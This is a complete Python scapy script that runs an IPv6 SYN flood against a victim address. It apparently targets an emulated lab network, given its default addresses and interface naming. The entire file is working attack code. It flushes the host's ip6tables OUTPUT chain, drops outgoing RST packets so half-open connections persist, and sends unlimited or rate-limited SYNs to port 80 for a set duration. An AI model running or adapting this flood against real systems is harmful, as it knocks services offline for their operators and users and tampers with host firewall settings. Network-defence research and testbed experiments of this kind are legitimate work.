"""IPv6 SYN flood (scapy, L2) at one victim. Run per attacker host.
  python3 attack.py <victim_ipv6> [duration] [--rate pps] [--count n]
Victim MAC derived from the last hextet of its IPv6. Fixed src port (edge sprays
anyway). Drops kernel RSTs so the half-open flood is not cancelled.
"""
import re, sys, time, argparse, subprocess
from scapy.all import Ether, IPv6, TCP, sendp
import logging; logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

ap = argparse.ArgumentParser()
ap.add_argument('victim', nargs='?', default='2001:1:1::4')
ap.add_argument('duration', nargs='?', type=float, default=3.0)
ap.add_argument('--rate', type=float, default=0.0)      # 0 = flood
ap.add_argument('--count', type=int, default=0)         # 0 = unlimited (within duration)
a = ap.parse_args()
vmac = f"aa:00:00:00:00:{int(a.victim.split(':')[-1], 16):02x}"

subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)
subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp', '--tcp-flags', 'RST', 'RST', '-j', 'DROP'],
               capture_output=True)

link = subprocess.run(['ip', 'link'], capture_output=True, text=True).stdout
iface = next((m.group(1) for l in link.split('\n') if (m := re.search(r'\d+:\s+(h\d+-eth\d+)', l))), None)
mac = re.search(r'link/ether ([0-9a-f:]+)',
                subprocess.run(['ip', 'link', 'show', iface], capture_output=True, text=True).stdout).group(1)
a6 = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True).stdout
src = (re.search(r'inet6 (2001[0-9a-f:]+)/', a6) or [None, '2001:1:1::1'])[1]

inter = 0.0 if a.rate <= 0 else 1.0 / a.rate
n, t0 = 0, time.time()
while time.time() - t0 < a.duration and not (a.count and n >= a.count):
    sendp(Ether(src=mac, dst=vmac) / IPv6(src=src, dst=a.victim) /
          TCP(sport=20000, dport=80, flags="S", seq=1000 + n), iface=iface, verbose=0)
    n += 1
    if inter:
        s = t0 + n * inter - time.time()
        if s > 0: time.sleep(s)
print(f"[attack] {src} -> {a.victim}: {n} SYNs in {time.time()-t0:.1f}s")
